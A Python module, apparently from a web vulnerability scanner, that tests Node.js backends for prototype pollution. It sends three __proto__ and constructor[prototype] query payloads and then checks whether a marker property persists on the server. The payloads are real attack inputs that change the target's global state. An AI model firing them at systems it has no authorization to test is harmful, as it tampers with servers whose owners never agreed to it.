from awap.engines.attack.base import AttackModule

class PrototypePollutionModule(AttackModule):
    """
    Client-side and Server-side Prototype Pollution Module.
    Targeting modern Node.js/Express/Fastify backends.
    """
    PAYLOADS = [
        "__proto__[awap_pollution]=vulnerable_polluted",
        "constructor[prototype][awap_pollution]=vulnerable_polluted",
        "?__proto__.awap_pollution=polluted"
    ]

    async def run(self, url: str, params: list[dict]) -> list[dict]:
        findings = []
        for payload in self.PAYLOADS:
            test_url = f"{url}?{payload}" if "?" not in url else f"{url}&{payload}"
            try:
                # Step 1: Poison the global state (simulated)
                await self.client.get(test_url)
                
                # Step 2: Check if the pollution persisted in a subsequent request
                # This is a heuristic - usually requires specific logic to confirm
                # but we look for indicators in the response headers or body
                # that the server's object prototype was modified.
                resp = await self.client.get(url)
                if "vulnerable_polluted" in resp.text:
                    findings.append({
                        'vuln_class': 'PROTOTYPE_POLLUTION',
                        'url': url, 'param': 'Global Prototype',
                        'payload': payload,
                        'evidence': "Prototype property 'awap_pollution' reflected in subsequent response",
                        'severity': 'HIGH', 'cvss': 8.0,
                        'request_raw': test_url,
                        'response_raw': resp.text[:500]
                    })
                    break
            except Exception:
                pass
        return findings
